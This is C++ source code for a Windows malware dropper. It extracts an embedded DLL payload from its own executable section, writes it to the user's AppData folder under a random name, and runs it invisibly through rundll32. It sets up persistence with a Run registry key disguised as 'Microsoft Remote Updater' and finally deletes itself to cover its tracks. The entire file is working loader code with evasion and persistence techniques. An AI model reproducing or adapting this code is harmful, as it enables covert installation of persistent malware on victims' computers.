#include <Windows.h>
#include "tools.h"

INT WINAPI WinMain(HMODULE current, HMODULE previous, LPSTR cmd, INT show) {
	PBYTE module_base = PBYTE(Tools::GetImageBase());
	if (module_base != ERROR) {
		// extract payload from section
		DWORD module_size = NULL;
		PBYTE dll_memory = Tools::ExtractDllFile(module_base, &module_size);

		// move payload onto %appdata% with some random generated name
		DWORD bytes_written = NULL;
		WCHAR appdata_path[MAX_PATH];

		if (ExpandEnvironmentStringsW(TEXT("%APPDATA%"), appdata_path, MAX_PATH - 1) > 0) {
			wsprintfW(appdata_path, TEXT("%s\\%lu.%cl%c"), appdata_path, GetTickCount(), 'd', 'l');
			HANDLE new_file = CreateFileW(appdata_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (new_file != INVALID_HANDLE_VALUE) {
				WriteFile(new_file, dll_memory, module_size, &bytes_written, NULL);
			}
			CloseHandle(new_file);
		}
		LocalFree(dll_memory);

		// runs the dll after extraction
		WCHAR win_path[MAX_PATH];
		if (ExpandEnvironmentStringsW(TEXT("%WINDIR%"), win_path, MAX_PATH - 1) > 0) {
			if (wsprintfW(win_path, TEXT("%s\\System32\\rundll32.exe "), win_path) != NULL) {
				lstrcatW(win_path, appdata_path);
				lstrcatW(win_path, L",");
				lstrcatW(win_path, L"FunEntry");

				STARTUPINFO startup_inf{ 0 };
				PROCESS_INFORMATION process_information{ 0 };
				startup_inf.cb = sizeof(startup_inf);

				BOOL b = CreateProcessW(NULL, win_path, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startup_inf, &process_information);

				if (b) {
					HKEY reg_key;
					LONG bb = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &reg_key);
					if (bb == ERROR_SUCCESS) {
						RegSetValueEx(reg_key, L"Microsoft Remote Updater", 0, REG_SZ, (LPBYTE)win_path, sizeof(win_path));
						RegCloseKey(reg_key);
					}
					//WaitForSingleObject(process_information.hProcess, INFINITE);
					//CloseHandle(process_information.hProcess);
				}
			}
		}
	}

	// delete loader
	WCHAR del_cmd[MAX_PATH];
	if (ExpandEnvironmentStringsW(TEXT("%WINDIR%"), del_cmd, MAX_PATH - 1) > 0) {
		if (wsprintfW(del_cmd, TEXT("%s\\System32\\cmd.exe "), del_cmd) != NULL) {
			WCHAR app_name[MAX_PATH];
			GetModuleFileNameW(0, app_name, MAX_PATH);
			lstrcatW(del_cmd, L"/c del \"");
			lstrcatW(del_cmd, app_name);
			lstrcatW(del_cmd, L"\"");

			STARTUPINFO sii{ 0 };
			PROCESS_INFORMATION pii{ 0 };
			sii.cb = sizeof(sii);

			CreateProcessW(NULL, del_cmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &sii, &pii);
			return 0;
		}
	}
}